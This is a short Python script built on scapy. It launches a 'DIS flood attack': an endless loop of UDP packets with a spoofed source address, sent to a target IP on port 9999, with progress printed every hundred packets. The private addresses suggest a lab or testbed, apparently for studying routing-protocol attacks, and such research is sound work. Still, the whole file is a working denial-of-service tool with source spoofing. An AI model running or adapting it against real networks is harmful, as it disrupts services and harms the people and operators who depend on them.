import time
from datetime import datetime 
from scapy.all import *

TARGET_IP = "172.20.0.100"
FAKE_IP = "172.20.0.66"

def dis_flood_attack():
    payload = b"\x02:DIS:HelpMe"
    print(f"--- LAUNCHING DIS FLOOD ATTACK ON {TARGET_IP} ---")
    
    packet_count = 0
    while True:
        pkt = IP(src=FAKE_IP, dst=TARGET_IP)/UDP(dport=9999)/Raw(load=payload)
        send(pkt, verbose=0)
        
        packet_count += 1
        if packet_count % 100 == 0:
            # <--- NUEVO FORMATO DE PRINT
            now = datetime.now().strftime("%H:%M:%S")
            print(f"[{now}] [ATTACK] Sent {packet_count} DIS packets...")

if __name__ == "__main__":
    time.sleep(5)
    dis_flood_attack()